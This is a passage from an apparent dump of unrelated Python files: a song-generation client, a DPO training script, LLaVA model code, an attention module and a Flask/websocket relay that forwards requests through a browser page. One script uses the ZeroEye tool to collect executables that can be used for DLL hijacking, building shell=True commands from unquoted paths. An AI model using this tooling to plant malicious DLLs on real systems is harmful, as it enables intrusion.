\"empty\"\n            })\n        return headers\n\n    def create_complete_song(self, short_prompt, extend_prompts, outro_prompt, seed=-1, custom_lyrics_short=None, custom_lyrics_extend=None, custom_lyrics_outro=None, num_extensions=1):\n        print(\"Starting the generation of the complete song sequence...\")\n\n        # Generate the short song\n        print(\"Generating the short song...\")\n        short_song_result = self.create_song(short_prompt, seed, custom_lyrics_short)\n        if not short_song_result:\n            print(\"Error generating the short song.\")\n            return None\n\n        last_song_result = short_song_result\n        extend_song_results = []\n\n        # Generate the extend songs\n        for i in range(num_extensions):\n            if i < len(extend_prompts):\n                prompt = extend_prompts[i]\n                lyrics = custom_lyrics_extend[i] if custom_lyrics_extend and i < len(custom_lyrics_extend) else None\n            else:\n                prompt = extend_prompts[-1]  # Reuse the last prompt if not enough are provided\n                lyrics = custom_lyrics_extend[-1] if custom_lyrics_extend else None\n\n            print(f\"Generating extend song {i + 1}...\")\n            extend_song_result = self.extend(\n                prompt,\n                seed,\n                audio_conditioning_path=last_song_result[0]['song_path'],\n                audio_conditioning_song_id=last_song_result[0]['id'],\n                custom_lyrics=lyrics\n            )\n            if not extend_song_result:\n                print(f\"Error generating extend song {i + 1}.\")\n                return None\n\n            extend_song_results.append(extend_song_result)\n            last_song_result = extend_song_result\n\n        # Generate the outro\n        print(\"Generating the outro...\")\n        outro_song_result = self.add_outro(\n            outro_prompt,\n            seed,\n            audio_conditioning_path=last_song_result[0]['song_path'],\n            audio_conditioning_song_id=last_song_result[0]['id'],\n            custom_lyrics=custom_lyrics_outro\n        )\n        if not outro_song_result:\n            print(\"Error generating the outro.\")\n            return None\n\n        print(\"Complete song sequence generated and processed successfully.\")\n        return {\n            \"short_song\": short_song_result,\n            \"extend_songs\": extend_song_results,\n            \"outro_song\": outro_song_result\n        }\n\n    def create_song(self, prompt, seed=-1, custom_lyrics=None):\n        song_result = self.generate_song(prompt, seed, custom_lyrics)\n        if not song_result:\n            return None\n        track_ids = song_result.get('track_ids', [])\n        self.all_track_ids.extend(track_ids)\n        return self.process_songs(track_ids, \"short_songs\")\n\n    def extend(self, prompt, seed=-1, audio_conditioning_path=None, audio_conditioning_song_id=None, custom_lyrics=None):\n        extend_song_result = self.generate_extend_song(\n            prompt, seed, audio_conditioning_path, audio_conditioning_song_id, custom_lyrics\n        )\n        if not extend_song_result:\n            return None\n        extend_track_ids = extend_song_result.get('track_ids', [])\n        self.all_track_ids.extend(extend_track",
    "import os\nimport random\nimport time\nfrom collections import defaultdict\nfrom dataclasses import asdict, dataclass, field\nfrom types import SimpleNamespace\nfrom typing import List, Literal, Optional\n\nimport numpy as np\nimport pandas as pd\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nimport torch.optim as optim\nimport tyro\nfrom accelerate import Accelerator\nfrom accelerate.state import AcceleratorState\nfrom accelerate.utils import gather_object\nfrom datasets import load_dataset\nfrom rich.console import Console\nfrom rich.pretty import pprint\nfrom rich.table import Table\nfrom torch import optim\nfrom torch.utils.data import DataLoader\nfrom torch.utils.tensorboard import SummaryWriter\nfrom tqdm import tqdm\nfrom transformers import (\n    AutoConfig,\n    AutoModelForCausalLM,\n    AutoTokenizer,\n    GenerationConfig,\n    PreTrainedModel,\n    get_scheduler,\n)\nfrom peft import get_peft_model, LoraConfig\n\n\n@dataclass\nclass LabelHParams:\n    type: Optional[str] = None\n    num_train: int = 92832\n    num_labels: int = 2\n    source: Optional[str] = None\n\n\n# a patch\n@dataclass\nclass TaskHParams:\n    # Query params\n    query_length: int = 512\n    query_dataset: str = \"cleanrl/summarize_from_feedback_tldr_3_filtered_oai_preprocessing_1705009345\"\n\n    query_format_str: Optional[str] = \"SUBREDDIT: r/{subreddit}\\n\\nTITLE: {title}\\n\\nPOST: {post}\\n\\nTL;DR:\"\n    query_truncate_field: Optional[str] = \"post\"\n    query_truncate_text: Optional[str] = \"\\n\"\n    query_padding: Optional[str] = None  # defaults to repeated spaces\n    query_pad_side: Optional[str] = \"left\"\n\n    # Response params\n    response_length: int = 53\n\n    # Truncate response after the first occurrence of this token at or after index after when sampling.\n    truncate_token: Literal[\"eos\"] = \"eos\"\n    truncate_token_id: Optional[int] = None\n    truncate_after: int = 16\n    penalty_reward_value: int = -1\n\n    # LM params\n    temperature: float = 0.01\n\n@dataclass\nclass Args:\n    # common args\n    exp_name: str = \"pythia_2.8_dpo\"\n    \"\"\"the name of this experiment\"\"\"\n    seed: int = 555134\n    \"\"\"seed of the experiment\"\"\"\n    track: bool = True\n    \"\"\"if toggled, this experiment will be tracked with Weights and Biases\"\"\"\n    wandb_project_name: str = \"tldr_summarize_pythia\"\n    \"\"\"the wandb's project name\"\"\"\n    wandb_entity: Optional[str] = \"rollin_ref\"\n    \"\"\"the entity (team) of wandb's project\"\"\"\n    cuda: bool = True\n    \"\"\"Whether to use cuda if available.\"\"\"\n    run_name: Optional[str] = None\n    \"\"\"a unique name of this run\"\"\"\n    load_from_cache_file: bool = False\n    \"\"\"Whether to load data from the local cache file in `dataset.map`\"\"\"\n    push_to_hub: bool = False\n    \"whether to upload the saved model to huggingface\"\n    hf_entity: str = \"\"\n    \"the user or org name of the model repository from the Hugging Face Hub\"\n    deepspeed: bool = True\n    \"\"\"Whether to use deepspeed to train the model\"\"\"\n    print_sample_output_freq: int = 220\n    \"\"\"How often to print sample output\"\"\"\n    run_eval: bool = True\n    \"\"\"Whether to run evaluation\"\"\"\n\n    # optimizer args\n    eps: float = 1e-5\n    \"\"\"the epsilon value for the optimizer\"\"\"\n    lr: float = 3e-6\n    \"\"\"the learning rate\"\"\"\n    optimizer: Literal[\"adam\", \"adamw\"] = \"adamw\"\n    \"\"\"Which optimizer to use\"\"\"\n    scheduler: str = \"cosine\"\n    \"\"\"Which scheduler to use\"\"\"\n    warm_up_steps: int = 0\n    \"\"\"Number of warm up steps for the scheduler\"\"\"\n\n    world_size: Optional[int] = 8\n    \"\"\"The number of processes (GPUs) to use\"\"\"\n    num_train_epochs: int = 1\n    \"\"\"Number of epochs to train\"\"\"\n    num_updates: Optional[int] = None\n    \"\"\"The number of updates to train\"\"\"\n    gradient_accumulation_steps: int = 4\n    \"\"\"The number of gradient accumulation steps\"\"\"\n    local_micro_batch_size: Optional[int] = 2\n    \"\"\"The micro batch size per GPU (HF's `per_device_train_batch_size`)\"\"\"\n    total_episodes: Optional[int] = None\n    \"\"\"The total number of episodes in the dataset\"\"\"\n    micro_batch_size: Optional[int] = 16\n    \"\"\"The micro batch size across devices (HF's `per_device_train_batch_size` * `world_size`)\"\"\"\n    local_batch_size: Optional[int] = 8\n    \"\"\"The batch size per GPU (HF's `per_device_train_batch_size` * `gradient_accumulation_steps`)\"\"\"\n    batch_size: Optional[int] = 64\n    \"\"\"The batch size across devices (HF's `per_device_train_batch_size` * `world_size` * `gradient_accumulation_steps`)\"\"\"\n    local_eval_batch_size: int = 2\n    \"\"\"per rank eval batch size\"\"\"\n\n    # other args\n    #base_model: str = \"EleutherAI/pythia-160m\"\n    base_model: str = \"./models/sft_model_2.9\"\n    \"\"\"the name of the pretrained model to use\"\"\"\n    dropout_layer_keys: List[str] = field(\n        default_factory=lambda: [\"attn_pdrop\", \"embd_pdrop\", \"resid_pdrop\", \"summary_first_dropout\"]\n    )\n    \"\"\"Which layers to apply dropout to\"\"\"\n    output_dir: str = \"models/dpo_policy_model_2.8_lora\"\n    \"\"\"Where to save the model\"\"\"\n    label_dataset: str = \"cleanrl/summarize_from_feedback_oai_preprocessing_17",
    "#!/usr/bin/python3\n# coding:utf-8\n\n# @Time    : 2024/4/9 15:37\n# @Author  : E0tk1\n# @File    : server.py\n# @IDE     : PyCharm\n\nimport json\nimport asyncio\nimport websockets\nfrom flask import Flask, request, jsonify, make_response\nfrom threading import Thread\nfrom urllib.parse import unquote\nimport time\nimport random\nimport string\n\n\ndef generate_random_string(length=32):\n    characters = string.ascii_lowercase + string.digits\n    return ''.join(random.choice(characters) for _ in range(length))\n\n\ndef req_handle(verChar):\n    print(\"-----------------------------------------------------------------------------------------------\")\n    try:\n        hmethod = request.get_json()[\"method\"]\n        hurl = request.get_json()[\"url\"]\n        htype = request.get_json()[\"type\"]\n        try:\n            hheader = request.get_json()[\"header\"]\n        except:\n            hheader = \"\"\n        if htype == \"json\":\n            hdata = unquote(request.query_string.decode('utf-8')[5:])\n        else:\n            hdata = request.get_json()[\"data\"]\n        data = \"{}[][][][][][]{}[][][][][][]{}[][][][][][]{}[][][][][][]{}\".format(hmethod, hurl, htype, hdata, hheader)\n        print(\"\u8bf7\u6c42\u4fe1\u606f\uff1a\")\n        # print(\"\u6821\u9a8c\u7801\uff1a\" + verChar)\n        print(\"Method\uff1a{}\".format(hmethod))\n        print(\"URL\uff1a{}\".format(hurl))\n        print(\"Content-type\uff1a{}\".format(htype))\n        print(\"Headers\uff1a{}\".format(hheader))\n        print(\"Data\uff1a{}\".format( hdata))\n        data = verChar + \"------------\" + str(data)\n        return data\n    except:\n        print(\"\u53d1\u9001\u7ed9web\u5ba2\u6237\u7aef\u7684\u6d88\u606f\uff1a\\ndata\u6570\u636e\u9519\u8bef\")\n        print(\"-----------------------------------------------------------------------------------------------\")\n        return None\n\n\napp = Flask(__name__)\ntry:\n    app.json.ensure_ascii = False               # \u89e3\u51b3json\u4e2d\u6587\u4e71\u7801\u95ee\u9898(flask 2.3.0\u4ee5\u4e0a)\nexcept:\n    app.config['JSON_AS_ASCII'] = False         # \u89e3\u51b3json\u4e2d\u6587\u53d8Unicode\u7f16\u7801(flask 2.2.5\u4ee5\u4e0b)\nconnected_clients = set()\nloop = None  # \u5b58\u50a8\u4e8b\u4ef6\u5faa\u73af\u5f15\u7528\n\nmessage = \"\"\nlast_connect = None\n\n\n@app.route('/api', methods=['POST'])\ndef receive_data():\n    verChar = str(generate_random_string())\n    data = req_handle(verChar)\n    if not data:\n        return \"data\u6570\u636e\u9519\u8bef\"\n    if loop is not None and last_connect:\n        loop.call_soon_threadsafe(send_data_to_client, last_connect, data)\n    else:\n        print(\"ws\u5ba2\u6237\u7aef\u672a\u8fde\u63a5\")\n        return \"ws\u5ba2\u6237\u7aef\u672a\u8fde\u63a5\"\n    start_time = time.time()\n    while time.time() - start_time < 2:\n        try:\n            messages1 = message.split(\"------------\")\n            newmessages0 = messages1[0]     # \u8fd4\u56de\u7684\u6821\u9a8c\u7801\n            newmessages1 = messages1[1]     # \u8fd4\u56de\u7684\u72b6\u6001\u7801\n            newmessages2 = messages1[2]     # \u8fd4\u56de\u7684\u54cd\u5e94\u5934\n            newmessages3 = messages1[3]     # \u8fd4\u56de\u7684\u54cd\u5e94\u4f53\n            if verChar == newmessages0:\n                print(\"\u54cd\u5e94\u4fe1\u606f\uff1a\")\n                print(\"Code\uff1a\" + str(newmessages1))\n                print(\"Headers\uff1a\" + newmessages2)\n                print(\"Data\uff1a\" + newmessages3)\n                print(\"-----------------------------------------------------------------------------------------------\")\n\n                if newmessages2 == \"0\" and newmessages3 == \"0\":\n                    return \"\u7f51\u7ad9\u8bbf\u95ee\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\\n1\u3001URL\u662f\u5426\u6b63\u786e\uff01\\n2\u3001\u662f\u5426\u5b58\u5728\u8de8\u57df\u8bbf\u95ee\\n3\u3001\u7f51\u7ad9\u662f\u5426\u80fd\u6b63\u5e38\u8bbf\u95ee\"\n                newheaders = json.loads(newmessages2)\n\n                response = make_response(newmessages3, int(newmessages1))\n                for key, value in newheaders.items():\n                    response.headers[key] = value\n                return response\n        except:\n            time.sleep(0.1)\n    print(\"\u53d1\u9001\u7ed9web\u5ba2\u6237\u7aef\u7684\u6d88\u606f\uff1a\\n\u53d1\u9001\u7ed9\u4e86ws\u5ba2\u6237\u7aef\uff0c\u4f46\u662f\u6ca1\u6709\u8fd4\u56de\uff01\\n\u8bf7\u68c0\u67e5\uff1a\\n1\u3001\u7f51\u7ad9\u8bbf\u95ee\u65f6\u95f4\u662f\u5426\u8d85\u8fc72\u79d2\\n2\u3001ws\u5ba2\u6237\u7aef\u662f\u5426\u65ad\u5f00\u8fde\u63a5\")\n    print(\"-----------------------------------------------------------------------------------------------\")\n    return \"\u53d1\u9001\u7ed9\u4e86ws\u5ba2\u6237\u7aef\uff0c\u4f46\u662f\u6ca1\u6709\u8fd4\u56de\uff01\\n\u8bf7\u68c0\u67e5\uff1a\\n1\u3001\u7f51\u7ad9\u8bbf\u95ee\u65f6\u95f4\u662f\u5426\u8d85\u8fc72\u79d2\\n\u3001ws\u5ba2\u6237\u7aef\u662f\u5426\u65ad\u5f00\u8fde\u63a5\"\n\n\nasync def handle_client(websocket, path):\n    global message, last_connect\n    last_connect = websocket    # \u4fdd\u8bc1\u6d88\u606f\u53ea\u53d1\u9001\u7ed9\u6700\u65b0\u8fde\u63a5\u7684ws\u5ba2\u6237\u7aef\n    connected_clients.add(websocket)\n\n    token = await websocket.recv()\n    if token != 'password=123456':   # ws\u8fde\u63a5\u5bc6\u7801\n        await websocket.close()\n        return\n\n    client_address = websocket.remote_address\n\n    try:\n        headers = websocket.request_headers\n        oriin = headers.get('Origin')\n    except:\n        oriin = \"\"\n    print(\"ws\u5ba2\u6237\u7aef\u8fde\u63a5\u6210\u529f\uff0cIP\uff1a{}\uff0c\u7aef\u53e3\uff1a{}\uff0c\u6240\u5728\u7ad9\u70b9\u57df\u540d\uff1a{}\".format(client_address[0], client_address[1], oriin))\n    await websocket.send(\"success!\")\n\n    while True:\n        try:\n            message = await websocket.recv()\n        except websockets.exceptions.ConnectionClosed:\n            connected_clients.remove(websocket)\n            break\n\n\ndef send_data_to_client(websocket, data):\n    try:\n        asyncio.run_coroutine_threadsafe(websocket.send(data), loop)\n    except websockets.exceptions.ConnectionClosed:\n        connected_clients.remove(websocket)\n\n\ndef start_ws_server():\n    global loop\n    loop = asyncio.new_event_loop()\n    asyncio.set_event_loop(loop)\n    server = websockets.serve(handle_client, \"0.0.0.0\", 8765)\n    loop.run_until_complete(server)\n    loop.run_forever()\n\n\ndef start_flask_app():\n    app.run(",
    "# coding=utf-8\n# Copyright 2023 Microsoft Research & University of Wisconsin-Madison and the HuggingFace Inc. team. All rights reserved.\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\" Llava model configuration\"\"\"\n\n\n# from ...configuration_utils import PretrainedConfig\n# from ...utils import logging\n# from ..auto import CONFIG_MAPPING\nfrom transformers.configuration_utils import PretrainedConfig\nfrom transformers.utils import logging\nfrom transformers.models.auto import CONFIG_MAPPING\n\n\nlogger = logging.get_logger(__name__)\n\nLLAVA_PRETRAINED_CONFIG_ARCHIVE_MAP = {\n    \"llava-hf/llava-v1.5-7b\": \"https://huggingface.co/llava-hf/llava-v1.5-7b/resolve/main/config.json\",\n}\n\n\nclass LlavaConfig(PretrainedConfig):\n    r\"\"\"\n    This is the configuration class to store the configuration of a [`LlavaForConditionalGeneration`]. It is used to instantiate an\n    Llava model according to the specified arguments, defining the model architecture. Instantiating a configuration\n    with the defaults will yield a similar configuration to that of the Llava-9B.\n\n    e.g. [llava-hf/llava-9b](https://huggingface.co/llava-hf/llava-9b)\n\n    Configuration objects inherit from [`PretrainedConfig`] and can be used to control the model outputs. Read the\n    documentation from [`PretrainedConfig`] for more information.\n\n    Args:\n        vision_config (`LlavaVisionConfig`,  *optional*):\n            Custom vision config or dict\n        text_config (`Union[AutoConfig, dict]`, *optional*):\n            The config object of the text backbone. Can be any of `LlamaConfig` or `MistralConfig`.\n        ignore_index (`int`, *optional*, defaults to -100):\n            The ignore index for the loss function.\n        image_token_index (`int`, *optional*, defaults to 32000):\n            The image token index to encode the image prompt.\n        projector_hidden_act (`str`, *optional*, defaults to `\"gelu\"`):\n            The activation function used by the multimodal projector.\n        vision_feature_select_strategy (`str`, *optional*, defaults to `\"default\"`):\n            The feature selection strategy used to select the vision feature from the CLIP backbone.\n        vision_feature_layer (`int`, *optional*, defaults to -2):\n            The index of the layer to select the vision feature.\n        vocab_size (`int`, *optional*, defaults to 32000):\n            Vocabulary size of the Llava model. Defines the number of different tokens that can be represented by the\n            `inputs_ids` passed when calling [`~LlavaForConditionalGeneration`]\n\n    Example:\n\n    ```python\n    >>> from transformers import LlavaForConditionalGeneration, LlavaConfig, CLIPVisionConfig, LlamaConfig\n\n    >>> # Initializing a CLIP-vision config\n    >>> vision_config = CLIPVisionConfig()\n\n    >>> # Initializing a Llama config\n    >>> text_config = LlamaConfig()\n\n    >>> # Initializing a Llava llava-1.5-7b style configuration\n    >>> configuration = LlavaConfig(vision_config, text_config)\n\n    >>> # Initializing a model from the llava-1.5-7b style configuration\n    >>> model = LlavaForConditionalGeneration(configuration)\n\n    >>> # Accessing the model configuration\n    >>> configuration = model.config\n    ```\"\"\"\n\n    model_type = \"llava\"\n    is_composition = False\n\n    def __init__(\n        self,\n        vision_config=None,\n        text_config=None,\n        ignore_index=-100,\n        image_token_index=32000,\n        projector_hidden_act=\"gelu\",\n        vision_feature_select_strategy=\"default\",\n        vision_feature_layer=-2,\n        vocab_size=32000,\n        **kwargs,\n    ):\n        self.ignore_index = ignore_index\n        self.image_token_index = image_token_index\n        self.projector_hidden_act = projector_hidden_act\n        self.vision_feature_select_strategy = vision_feature_select_strategy\n        self.vision_feature_layer = vision_feature_layer\n        self.vocab_size = vocab_size\n\n        self.vision_config = vision_config\n\n        if isinstance(self.vision_config, dict):\n            vision_config[\"model_type\"] = (\n                vision_config[\"model_type\"] if \"model_type\" in vision_config else \"clip_vision_model\"\n            )\n            self.vision_config = CONFIG_MAPPING[vision_config[\"model_type\"]](**vision_config)\n        elif vision_config is None:\n            self.vision_config = CONFIG_MAPPING[\"clip_vision_model\"](\n                intermediate_size=4096,\n                hidden_size=1024,\n                patch_size=14,\n                image_size=336,\n                num_hidde",
    "import torch\nimport einops\nimport torch.nn as nn\nimport torch.nn.functional as F\n\n\nclass InfiniAttention(nn.Module):\n    def __init__(self, dim, heads=8, dim_head=64, seq_len=100):\n        super().__init__()\n        inner_dim = dim_head * heads\n        self.heads = heads\n        self.scale = dim_head**-0.5\n\n        self.in_linear = nn.Linear(dim, inner_dim)\n\n        self.k_linear = nn.Linear(dim, inner_dim, bias=False)\n        self.v_linear = nn.Linear(dim, inner_dim, bias=False)\n        self.q_linear = nn.Linear(dim, inner_dim, bias=False)\n\n        self.out_linear = nn.Linear(inner_dim, dim)\n\n        self.long_term_memory = torch.zeros(1, heads, dim_head, dim_head)\n        self.long_term_memory_norm = torch.zeros(1, heads, seq_len, 1)\n\n        self.local_memory_scalar = nn.Parameter(torch.tensor(1.0))\n        self.long_term_memory_scalar = nn.Parameter(torch.tensor(1.0))\n        self.long_term_memory_gate = nn.Linear(dim, seq_len, bias=False)\n\n    def _query_long_term_memory(self, q):\n        memory = (F.elu(q) @ self.long_term_memory) / (\n            F.elu(q) * self.long_term_memory_norm\n        )\n        return memory\n\n    def _update_long_term_memory(self, k, v):\n        v_term = v - (\n            (F.elu(k) @ self.long_term_memory) / (F.elu(k) * self.long_term_memory_norm)\n        )\n        self.long_term_memory = (\n            self.long_term_memory + F.elu(k).transpose(-2, -1) @ v_term\n        )\n        self.long_term_memory_norm = F.elu(k).sum(dim=-1)\n\n    def forward(self, q, k, v, mask=None):\n        q, k, v = self.q_linear(q), self.k_linear(k), self.v_linear(v)\n\n        q, k, v = map(\n            lambda t: einops.rearrange(t, \"b n (h d) -> b h n d\", h=self.heads),\n            (q, k, v),\n        )\n\n        # Local attention\n        sim = q @ k.transpose(-2, -1) * self.scale\n        local_attn = sim.softmax(dim=-1)\n        if mask is not None:\n            local_attn = local_attn.masked_fill(mask == 0, 0)\n        # Gating\n        local_attn = (1 - F.sigmoid(self.local_memory_scalar)) * local_attn\n\n        # Long-term memory attention\n        long_term_memory = self._query_long_term_memory(q)\n        long_term_memory = F.sigmoid(\n            self.long_term_memory_scalar\n        ) * self.long_term_memory_gate(long_term_memory)\n\n        attn = local_attn + long_term_memory\n\n        self._update_long_term_memory(k, v)\n\n        out = attn @ v\n\n        out = einops.rearrange(out, \"b h n d -> b n (h d)\")\n        return self.out_linear(out)\n\n\nif __name__ == \"__main__\":\n    net = InfiniAttention(64)\n    q = torch.randn(1, 100, 64)\n    k = torch.randn(1, 100, 64)\n    v = torch.randn(1, 100, 64)\n    out = net(q, k, v)\n    print(out.shape)\n",
    "#    Copyright 2023 Haotian Liu\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\");\n#    you may not use this file except in compliance with the License.\n#    You may obtain a copy of the License at\n#\n#        http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS,\n#    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n#    See the License for the specific language governing permissions and\n#    limitations under the License.\n\n\nfrom abc import ABC, abstractmethod\n\nimport torch\nimport torch.nn as nn\n\nfrom .multimodal_encoder.builder import build_vision_tower\nfrom .multimodal_projector.builder import build_vision_projector\n\nfrom llava.constants import IGNORE_INDEX, IMAGE_TOKEN_INDEX, DEFAULT_IMAGE_PATCH_TOKEN, DEFAULT_IM_START_TOKEN, DEFAULT_IM_END_TOKEN\n\nfrom llava.mm_utils import get_anyres_image_grid_shape\n\n\nclass LlavaMetaModel:\n\n    def __init__(self, config):\n        super(LlavaMetaModel, self).__init__(config)\n\n        if hasattr(config, \"mm_vision_tower\"):\n            self.vision_tower = build_vision_tower(config, delay_load=True)\n            self.mm_projector = build_vision_projector(config)\n\n            if 'unpad' in getattr(config, 'mm_patch_merge_type', ''):\n                self.image_newline = nn.Parameter(\n                    torch.empty(config.hidden_size, dtype=self.dtype)\n                )\n\n    def get_vision_tower(self):\n        vision_tower = getattr(self, 'vision_tower', None)\n        if type(vision_tower) is list:\n            vision_tower = vision_tower[0]\n        return vision_tower\n\n    def initialize_vision_modules(self, model_args, fsdp=None):\n        vision_tower = model_args.vision_tower\n        mm_vision_select_layer = model_args.mm_vision_select_layer\n        mm_vision_select_feature = model_args.mm_vision_select_feature\n        pretrain_mm_mlp_adapter = model_args.pretrain_mm_mlp_adapter\n        mm_patch_merge_type = model_args.mm_patch_merge_type\n\n        self.config.mm_vision_tower = vision_tower\n\n        if self.get_vision_tower() is None:\n            vision_tower = build_vision_tower(model_args)\n\n            if fsdp is not None and len(fsdp) > 0:\n                self.vision_tower = [vision_tower]\n            else:\n                self.vision_tower = vision_tower\n        else:\n            if fsdp is not None and len(fsdp) > 0:\n                vision_tower = self.vision_tower[0]\n            else:\n                vision_tower = self.vision_tower\n            vision_tower.load_model()\n\n        self.config.use_mm_proj = True\n        self.config.mm_projector_type = getattr(model_args, 'mm_projector_type', 'linear')\n        self.config.mm_hidden_size = vision_tower.hidden_size\n        self.config.mm_vision_select_layer = mm_vision_select_layer\n        self.config.mm_vision_select_feature = mm_vision_select_feature\n        self.config.mm_patch_merge_type = mm_patch_merge_type\n\n        if getattr(self, 'mm_projector', None) is None:\n            self.mm_projector = build_vision_projector(self.config)\n\n            if 'unpad' in mm_patch_merge_type:\n                embed_std = 1 / torch.sqrt(torch.tensor(self.config.hidden_size, dtype=self.dtype))\n                self.image_newline = nn.Parameter(\n                    torch.randn(self.config.hidden_size, dtype=self.dtype) * embed_std\n                )\n        else:\n            # In case it is frozen by LoRA\n            for p in self.mm_projector.parameters():\n                p.requires_grad = True\n\n        if pretrain_mm_mlp_adapter is not None:\n            mm_projector_weights = torch.load(pretrain_mm_mlp_adapter, map_location='cpu')\n            def get_w(weights, keyword):\n                return {k.split(keyword + '.')[1]: v for k, v in weights.items() if keyword in k}\n\n            self.mm_projector.load_state_dict(get_w(mm_projector_weights, 'mm_projector'))\n\n\ndef unpad_image(tensor, original_size):\n    \"\"\"\n    Unpads a PyTorch tensor of a padded and resized image.\n\n    Args:\n    tensor (torch.Tensor): The image tensor, assumed to be in CxHxW format.\n    original_size (tuple): The original size of the image (height, width).\n\n    Returns:\n    torch.Tensor: The unpadded image tensor.\n    \"\"\"\n    original_width, original_height = original_size\n    current_height, current_width = tensor.shape[1:]\n\n    original_aspect_ratio = original_width / original_height\n    current_aspect_ratio = current_width / current_height\n\n    if original_aspect_ratio > current_aspect_ratio:\n        scale_factor = current_width / original_width\n        new_height = int(original_height * scale_factor)\n        padding = (current_height - new_height) // 2\n        unpadded_tensor = tensor[:, padding:current_height - padding, :]\n    else:\n        scale_factor = current_height / original_height\n        new_width = int(original_width * scale_factor)\n        padding = (current_width - new_width) // 2\n",
    "import os\r\nimport re\r\nimport subprocess\r\nimport shutil\r\n\r\n\r\n\r\ndef create_directory(directory_path):\r\n    try:\r\n        os.makedirs(directory_path, exist_ok=True)\r\n\r\n    except OSError as e:\r\n        # print(f\"\u521b\u5efa\u76ee\u5f55 {directory_path} \u5931\u8d25: {e}\")\r\n        pass\r\n\r\ndef clean_filename(filename):\r\n    # \u79fb\u9664\u6587\u4ef6\u540d\u4e2d\u7684\u975e\u6cd5\u5b57\u7b26\r\n    return re.sub(r'[\\\\/*?:\"<>|]', '', filename)\r\n\r\ndef copy_file(source_path, destination_path):\r\n    try:\r\n        shutil.copy(source_path, destination_path)\r\n    except FileNotFoundError as e:\r\n        # print(f\"\u65e0\u6cd5\u590d\u5236\u6587\u4ef6 {source_path} \u81f3 {destination_path}: {e}\")\r\n        pass\r\n    except Exception as e:\r\n        # print(f\"\u590d\u5236\u6587\u4ef6\u65f6\u51fa\u73b0\u9519\u8bef: {e}\")\r\n        pass\r\ndef execute_command(command):\r\n    try:\r\n        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\r\n        return result.stdout.decode(\"utf-8\")\r\n    except subprocess.CalledProcessError as e:\r\n        # print(f\"\u547d\u4ee4\u6267\u884c\u9519\u8bef: {e}\")\r\n        return \"\"\r\n\r\ndef find_executables(root_dir, is_x64):\r\n    try:\r\n        for root, dirs, files in os.walk(root_dir):\r\n            for file in files:\r\n                if file.endswith(\".exe\"):\r\n                    executable_path = os.path.join(root, file)\r\n\r\n                    _x64 = \"x64\" if is_x64.lower() == \"y\" else \"x86\"\r\n                    try:\r\n                        CMD_result = execute_command(f\"cd {_x64} && ZeroEye.exe {executable_path}\")\r\n\r\n                        if CMD_result.find(\"User DLL Name\") != -1:\r\n                            results = CMD_result.split(\"\\n\")\r\n                            print(executable_path)\r\n                            info_path = f\"bin/{_x64}/{clean_filename(file)}\".replace(\".exe\", \"\")\r\n                            create_directory(info_path)\r\n                            copy_file(executable_path, os.path.join(info_path, file))\r\n\r\n                            for result in results:\r\n                                if result.find(\"User DLL Name\") != -1:\r\n                                    Dll_Name = result.replace(\"User DLL Name: \", \"\").strip()\r\n                                    clean_dll_name = clean_filename(Dll_Name)\r\n                                    copy_file(os.path.join(root, Dll_Name), os.path.join(info_path, clean_dll_name))\r\n                                    with open(f\"{info_path}/info.txt\", \"w\") as file:\r\n                                        file.write(f\"{root}\\n{CMD_result}\")\r\n\r\n\r\n                            if len(os.listdir(info_path)) == 2:\r\n                                shutil.rmtree(info_path)\r\n                                break\r\n\r\n\r\n                    except Exception as e:\r\n                        # print(f\"\u6267\u884c\u547d\u4ee4\u65f6\u51fa\u73b0\u9519\u8bef: {e}\")\r\n                        pass\r\n    except Exception as e:\r\n        pass\r\n        # print(f\"\u904d\u5386\u6587\u4ef6\u65f6\u51fa\u73b0\u9519\u8bef: {e}\")\r\n\r\nif __name__ == \"__main__\":\r\n\r\n    create_directory(\"bin\")\r\n    try:\r\n        root_dir = input(\"\u8bf7\u8f93\u5165\u8def\u5f84\uff1a\")\r\n        is_x64 = input(\"\u662f\u5426x64[y/n]:\")\r\n        find_executables(root_dir, is_x64)\r\n    except KeyboardInterrupt:\r\n        print(\"\u7528\u6237\u7ec8\u6b62\u4e86\u7a0b\u5e8f\u6267\u884c\u3002\")\r\n",
    "import gc\r\nimport hashlib\r\nimport importlib\r\nimport json\r\nimport os\r\nimport re\r\nimport sys\r\nimport base64\r\nfrom PIL import Image\r\nimport numpy as np\r\nimport io\r\nimport time\r\nimport traceback\r\nfrom langchain_text_splitters import RecursiveCharacterTextSplitter\r\nfrom langchain_community.vectorstores import FAISS\r\nimport openai\r\nimport requests\r\nimport torch\r\nfrom .config import config_path,current_dir_path,load_api_keys\r\nfrom .tools.load_file import load_file\r\nfrom .tools.tool_combine import tool_combine,tool_combine_plus\r\nfrom .tools.get_time import get_time,time_tool\r\nfrom .tools.get_weather import get_weather,weather_tool\r\nfrom .tools.search_web import search_web,google_tool\r\nfrom .tools.check_web import check_web,check_web_tool\r\nfrom .tools.file_combine import file_combine,file_combine_plus\r\nfrom .tools.dialog import start_dialog,end_dialog\r\nfrom .tools.interpreter import interpreter,interpreter_tool\r\nfrom .tools.load_persona import load_persona\r\nfrom .tools.classify_persona import classify_persona\r\nfrom .tools.classify_function import classify_function\r\nfrom .tools.load_ebd import ebd_tool,data_base\r\nfrom .tools.custom_persona import custom_persona\r\nfrom transformers import AutoTokenizer, AutoModel, Qwen2Tokenizer, Qwen2ForCausalLM, AutoModelForCausalLM\r\nglm_tokenizer=\"\"\r\nglm_model=\"\"\r\nllama_tokenizer=\"\"\r\nllama_model=\"\"\r\nqwen_tokenizer=\"\"\r\nqwen_model=\"\"\r\n_TOOL_HOOKS=[\r\n    \"get_time\",\r\n    \"get_weather\",\r\n    \"search_web\",\r\n    \"check_web\",\r\n    \"interpreter\",\r\n    